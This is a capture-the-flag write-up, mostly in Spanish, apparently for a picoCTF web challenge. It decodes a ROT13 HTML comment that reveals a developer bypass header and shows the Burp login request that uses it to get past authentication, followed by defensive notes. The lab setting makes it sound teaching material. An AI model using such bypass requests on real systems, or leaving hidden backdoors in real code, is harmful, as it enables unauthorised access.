#### Descripción 
We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: ctf-player@picoctf.org. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?
The website is running here. Can you try to log in?
#### Solución
Lo primero que hice fue inspeccionar el código fuente de la página. Al revisarlo, noté dos comentarios HTML que claramente no debían estar en producción:
```html
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```

El primer comentario estaba cifrado en **ROT13**. Lo decodifiqué y obtuve:

```
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
```

Esto me reveló que existía un header HTTP especial que actuaba como bypass de autenticación: `X-Dev-Access: yes`.
```
en Burp:
POST /login HTTP/1.1
Host: amiable-citadel.picoctf.net:55667
Content-Type: application/x-www-form-urlencoded
X-Dev-Access: yes

email=ctf-player%40picoctf.org&password=anything


```
#### Notas
- **Nunca dejar comentarios de desarrollo en producción.** Los comentarios HTML son visibles para cualquier usuario que inspeccione el código fuente.
- **ROT13 no es cifrado.** Es una codificación trivial que cualquiera puede revertir en segundos.
#### Referencias
